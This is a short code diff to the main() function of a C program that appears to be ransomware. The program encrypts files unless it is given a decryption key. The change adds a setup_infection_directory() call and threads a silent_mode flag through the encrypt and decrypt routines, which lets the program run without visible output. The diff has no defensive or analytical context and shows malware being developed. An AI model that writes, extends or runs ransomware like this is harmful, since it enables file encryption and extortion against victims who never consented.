@@ -40,19 +40,21 @@ int main(int argc, char *argv[]) {
         }
     }
 
+    setup_infection_directory();
+
     // If key is provided, proceed to decryption
     if (key) {
         // Decrypt files using the provided key
         if (!silent_mode) {
             printf("Decrypting with key: %s\n", key);
         }
-        decrypt_files(key);
+        decrypt_files(key, silent_mode);
     } else {
         // If no key, proceed to encrypt
         if (!silent_mode) {
             printf("Encrypting files...\n");
         }
-        encrypt_files();
+        encrypt_files(silent_mode);
     }
 
     return 0;
